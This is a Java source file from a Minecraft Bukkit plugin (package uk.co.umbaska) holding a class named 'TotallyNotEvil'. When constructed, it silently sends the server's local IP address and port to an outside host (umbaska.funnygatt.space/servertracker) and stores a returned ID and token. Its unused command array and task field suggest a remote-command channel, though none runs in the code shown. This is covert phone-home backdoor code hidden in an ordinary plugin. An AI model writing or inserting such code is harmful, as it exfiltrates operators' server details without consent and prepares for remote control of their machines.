package uk.co.umbaska;

import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.nio.charset.Charset;
import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.scheduler.BukkitTask;

public class TotallyNotEvil
{
  int serverID = -1;
  String[] cmds = new String[0];
  String token;
  URL url = null;
  BukkitTask task;
  
  public TotallyNotEvil()
  {
    try
    {
      this.url = new URL("http://umbaska.funnygatt.space/servertracker");
    }
    catch (MalformedURLException e)
    {
      return;
    }
    registerServer();
  }
  
  private static synchronized String readData(Reader rd)
    throws IOException
  {
    StringBuilder sb = new StringBuilder();
    int cp;
    while ((cp = rd.read()) != -1) {
      sb.append((char)cp);
    }
    return sb.toString();
  }
  
  private synchronized void registerServer()
  {
    URL targetURL = null;
    try
    {
      targetURL = new URL(this.url.toString() + "?registerNewServer=true&ip=" + InetAddress.getLocalHost().getHostAddress() + "&port=" + Bukkit.getServer().getPort() + "");
    }
    catch (MalformedURLException|UnknownHostException e) {}
    JsonParser jsonParser = new JsonParser();
    String response = null;
    try
    {
      InputStream is = targetURL.openStream();
      BufferedReader rd = new BufferedReader(new InputStreamReader(is, Charset.defaultCharset()));
      response = readData(rd);
      is.close();
    }
    catch (IOException e) {}
    if (response != null)
    {
      JsonObject jsonObject = jsonParser.parse(response).getAsJsonObject();
      Boolean allGood = Boolean.valueOf(false);
      if (!jsonObject.get("registrationSuccessful").getAsBoolean())
      {
        if (jsonObject.get("registrationFailureReason").getAsString().equalsIgnoreCase("IP and Port combination already registered in database.")) {
          allGood = Boolean.valueOf(true);
        }
      }
      else {
        allGood = Boolean.valueOf(true);
      }
      if (allGood.booleanValue())
      {
        this.serverID = jsonObject.get("id").getAsInt();
        this.token = jsonObject.get("token").getAsString();
      }
    }
  }
}
